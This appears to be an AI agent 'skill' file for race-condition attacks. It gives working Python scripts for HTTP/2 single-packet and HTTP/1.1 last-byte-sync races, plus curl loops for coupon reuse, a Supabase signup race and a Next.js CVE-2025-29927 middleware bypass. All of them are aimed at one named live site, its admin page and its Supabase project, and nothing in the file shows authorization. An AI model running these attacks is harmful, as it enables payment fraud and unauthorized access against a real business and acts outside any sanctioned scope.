# Race Condition Attack

**Invoke this skill for time-of-check-time-of-use (TOCTOU), limit bypass, and parallel request race attacks.**

## When to use
- Coupon/voucher reuse (apply 1 coupon 100x in parallel)
- Credit/balance double-spend
- Rate limit bypass via parallel flooding
- File upload TOCTOU (write→check→execute window)
- Session fixation races
- Payment race conditions

## CVEs (2025-2026)
- CVE-2025-29927 — Next.js middleware bypass via `x-middleware-subrequest` (CVSS 9.1, CISA KEV 2025-03-27)
- CVE-2024-34351 — Next.js SSRF via Host header redirect race
- Race conditions in Supabase RLS during concurrent transactions

## Core Technique: HTTP/2 Single-Packet Attack (Fastest)

```python
#!/usr/bin/env python3
"""
Race condition via HTTP/2 single-packet attack.
Sends N requests in ONE TCP packet — server processes them simultaneously.
"""
import socket, ssl, threading, time, h2.connection, h2.config, h2.events

TARGET = "vapelabvca.com"
PORT = 443
N_REQUESTS = 50  # parallel requests in one packet

def h2_race(path, method="POST", body=b"", headers=None, n=N_REQUESTS):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    
    config = h2.config.H2Configuration()
    conn = h2.connection.H2Connection(config=config)
    
    raw = socket.create_connection((TARGET, PORT), timeout=10)
    s = ctx.wrap_socket(raw, server_hostname=TARGET)
    conn.initiate_connection()
    s.sendall(conn.data_to_send(65535))
    
    req_headers = [
        (":method", method),
        (":path", path),
        (":scheme", "https"),
        (":authority", TARGET),
        ("content-type", "application/json"),
        ("content-length", str(len(body))),
    ]
    if headers:
        req_headers.extend(headers.items())
    
    stream_ids = []
    # Queue all streams (headers only, no data yet)
    for i in range(n):
        sid = conn.get_next_available_stream_id()
        conn.send_headers(sid, req_headers, end_stream=(len(body) == 0))
        stream_ids.append(sid)
    
    # Send data for all streams in one flush
    if body:
        for sid in stream_ids:
            conn.send_data(sid, body, end_stream=True)
    
    # ONE sendall — single TCP packet (below MTU) sends all N requests
    s.sendall(conn.data_to_send(65535))
    
    results = {}
    while len(results) < n:
        data = s.recv(65535)
        if not data:
            break
        events = conn.receive_data(data)
        s.sendall(conn.data_to_send(65535))
        for event in events:
            if isinstance(event, h2.events.ResponseReceived):
                for k, v in event.headers:
                    if k == b":status":
                        results[event.stream_id] = v.decode()
            elif isinstance(event, h2.events.StreamEnded):
                pass
    s.close()
    return results

# Example: Race a coupon endpoint
results = h2_race(
    path="/api/coupon/apply",
    method="POST",
    body=b'{"code":"DISCOUNT10","order_id":"123"}',
    headers={"cookie": "session=YOUR_SESSION", "authorization": "Bearer TOKEN"},
    n=30
)
counts = {}
for r in results.values():
    counts[r] = counts.get(r, 0) + 1
print("Race results:", counts)
# If >1 "200" response: race condition confirmed
```

## HTTP/1.1 Last-Byte Sync Attack (No h2 library needed)

```python
#!/usr/bin/env python3
"""Send N requests simultaneously via last-byte sync."""
import socket, ssl, threading, time

TARGET = "vapelabvca.com"
N = 30

def make_request_bytes(path, token, body=b"{}"):
    """Prepare full HTTP/1.1 request bytes."""
    hdrs = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: Bearer {token}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return hdrs

def connect_ssl():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((TARGET, 443), timeout=10)
    return ctx.wrap_socket(raw, server_hostname=TARGET)

token = "YOUR_JWT_TOKEN"
path = "/api/orders/checkout"
body = b'{"cart_id":"abc123"}'
req = make_request_bytes(path, token, body)

# Pre-build N connections
socks = [connect_ssl() for _ in range(N)]
# Send all but last byte
[s.sendall(req[:-1]) for s in socks]
# Simultaneous last byte
barrier = threading.Barrier(N)
results = []
def send_last(s):
    barrier.wait()  # synchronize
    s.sendall(req[-1:])
    resp = b""
    s.settimeout(5)
    try:
        while True:
            d = s.recv(4096)
            if not d: break
            resp += d
    except: pass
    results.append(resp.split(b"\r\n")[0].decode(errors="replace"))
    s.close()

threads = [threading.Thread(target=send_last, args=(s,)) for s in socks]
[t.start() for t in threads]
[t.join() for t in threads]

from collections import Counter
print("Results:", Counter(results))
```

## Targets on vapelabvca.com

### 1. Supabase Auth Race (Register → verify email → RLS bypass window)
```bash
# Concurrent registration attempts with same email
for i in $(seq 1 20); do
  curl -s -X POST "https://srqtxlmisfkiofuixrtm.supabase.co/auth/v1/signup" \
    -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
    -H "Content-Type: application/json" \
    -d '{"email":"race_'$RANDOM'@test.com","password":"Test@1234"}' &
done
wait
```

### 2. Next.js CVE-2025-29927 Middleware Bypass
```bash
# Bypass authentication middleware
curl -sk "https://vapelabvca.com/admin" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -w "\nHTTP: %{http_code}\n"
# If 200 instead of 401/302: middleware bypassed
```

### 3. Shopping Cart / Order Race
```bash
# Apply promotional code in parallel
TOKEN="your_jwt"
for i in $(seq 1 50); do
  curl -s -X POST "https://vapelabvca.com/api/discount/apply" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code":"FIRST10"}' &
done
wait | sort | uniq -c
```
